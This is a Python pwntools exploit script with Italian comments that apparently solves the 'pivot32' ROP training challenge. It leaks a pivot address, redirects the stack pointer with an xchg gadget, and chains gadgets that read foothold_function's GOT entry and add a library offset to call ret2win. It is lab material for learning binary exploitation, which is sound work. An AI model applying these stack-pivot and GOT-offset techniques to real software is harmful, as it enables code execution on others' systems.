from pwn import *
import io
elf = ELF("./pivot32")
lib = ELF("./libpivot32.so")
p = process("./pivot32")

"""
    Per questo esercizio ci viene fornito direttamente dal programma un indirizzo di memoria da
    utilizzare come pivot. In pratica viene eseguita una traslazione virtuale dello stack, 
    facendo finta che questi sia collocato in una posizione diversa dall'originale, poiché
    altrimenti non sarebbe possibile inserire la ropchain nello spazio originale che risulta
    essere molto ridotto.

    Definisco una funzione che vada a pescare dal terminale l'indirizzo corretto, dato che cambia
    a ogni esecuzione del programma.
"""
def get_pivot():
    for _ in range(4):
        p.recvline()
    line = p.recvline()
    pivot = p32(int(line[56:64],16))
    return pivot
pivot = get_pivot()

pop_eax = p32(0x0804882c)
pop_ebx = p32(0x080484a9)
xchg_eax_esp = p32(0x0804882e)
mov_eax_dword_eax = p32(0x08048830)
add_eax_ebx = p32(0x08048833)
popal = p32(0x0804874d)
call_eax = p32(0x080485f0)

"""
    PLT = Procedure Linkage Table --> Cerca nella got.plt gli offset delle funzioni da chiamare. Se un
    								  indirizzo non è già presente nella GOT, allora ne richiede 
    								  l'inserimento
    GOT = Global Offset Table ------> Contiene gli offset delle funzioni importate da librerie esterne
    
    Sfruttiamo la chiamata a plt e a got della funzione foothold_function. Nel momento in cui viene chiamata 
    plt.foothold_function, facendo parte di una libreria esterna al programma, il suo indirizzo all'interno 
    di tale libreria, se non già presente, viene riportato su got, in modo da poter chiamare tale funzione
    successivamente. All'interno della stessa libreria è presente anche ret2win, cioè la funzione che 
    vorremmo chiamare, quindi possiamo usare foothold_function come trigger per l'inserimento in GOT di un 
    offset, andando poi a inserire l'indirizzo che vogliamo noi, cioè quello di ret2win.
"""

foothold_function = p32(elf.symbols["plt.foothold_function"])
ret2win = p32(lib.symbols["ret2win"])
foothold_function_got_plt = p32(elf.symbols["got.foothold_function"])

"""
    Iniziamo traslando lo stack. In EAX mettiamo l'indirizzo del pivot, poi modifichiamo lo stack pointer 
    andando a scambiarne il valore con quello di EAX. Ora lo stack è spostato più in alto, consentendo 
    l'inserimento di una ropchain più lunga.
"""

rop1 = pop_eax + pivot + xchg_eax_esp

"""
    Iniziamo chiamando foothold_function. Il suo offset viene inserito automaticamente all'interno di got.plt,
    per cui lo salviamo in memoria scrivendolo in EAX. In seguito, in EAX non vogliamo più solo l'offset di
    foothold_function in got.plt, ma voglio un puntatore proprio all'area di memoria corrispondente, quindi
    facciamo mov EAX, [EAX]. In un altro registro, come EBX, andiamo a salvarci la differenza fra gli offset di
    foothold_function e ret2win nella libreria esterna, rispettivamente 0x77d e 0x974. 
    Fatto questo, spostiamo il puntatore a foothold_function in modo che punti a ret2win, andando a sommare la
    differenza fra gli offset a EAX, cioè al puntatore di foothold_function; infine chiamiamo la funzione
    puntata da EAX, cioè ret2win.
"""    

rop2 = foothold_function
rop2 += pop_eax + foothold_function_got_plt
rop2 += mov_eax_dword_eax
rop2 += pop_ebx + p32(0x974 - 0x77d)
rop2 += add_eax_ebx
rop2 += call_eax

p.recvuntil('> ') 
p.send(rop2)  
p.recvuntil('> ')      
random = cyclic(44) + rop1
p.send(random)
p.interactive()
